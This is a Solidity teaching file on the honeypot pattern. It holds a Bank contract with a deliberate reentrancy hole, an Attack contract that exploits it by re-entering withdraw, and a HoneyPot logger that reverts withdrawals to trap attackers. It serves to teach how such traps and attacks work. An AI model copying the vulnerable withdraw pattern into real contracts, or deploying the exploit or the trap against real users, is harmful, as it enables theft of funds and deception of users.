// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.24;

/**
 * @title Bank Contract
 * @notice This contract allows users to deposit and withdraw Ether.
 */
contract Bank {
    mapping(address => uint256) public balances;
    Logger logger;

    /**
     * @notice Constructor to set the Logger contract.
     * @param _logger The address of the Logger contract.
     */
    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    /**
     * @notice Allows a user to deposit Ether into the contract.
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    /**
     * @notice Allows a user to withdraw their Ether from the contract.
     */
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;

        logger.log(msg.sender, amount, "Withdraw");
    }
}

/**
 * @title Logger Contract
 * @notice This contract logs deposit and withdraw actions.
 */
contract Logger {
    event Log(address caller, uint256 amount, string action);

    /**
     * @notice Logs an action with the caller's address, amount, and action description.
     * @param _caller The address of the caller.
     * @param _amount The amount involved in the action.
     * @param _action The description of the action.
     */
    function log(address _caller, uint256 _amount, string memory _action)
        public
    {
        emit Log(_caller, _amount, _action);
    }
}

/**
 * @title Attack Contract
 * @notice This contract attempts to exploit a reentrancy vulnerability in the Bank contract.
 */
contract Attack {
    Bank bank;

    /**
     * @notice Constructor to set the Bank contract.
     * @param _bank The address of the Bank contract.
     */
    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    /**
     * @notice Fallback function to receive Ether and trigger reentrancy attack if conditions are met.
     */
    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }

    /**
     * @notice Initiates the attack by depositing and then withdrawing Ether.
     */
    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}

/**
 * @title HoneyPot Contract
 * @notice This contract contains a trap to revert transactions with specific actions.
 */
contract HoneyPot {
    /**
     * @notice Logs an action and reverts if the action is "Withdraw".
     * @param _caller The address of the caller.
     * @param _amount The amount involved in the action.
     * @param _action The description of the action.
     */
    function log(address _caller, uint256 _amount, string memory _action) public pure {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    /**
     * @notice Compares two strings using keccak256 hash.
     * @param _a The first string.
     * @param _b The second string.
     * @return bool True if the strings are equal, false otherwise.
     */
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
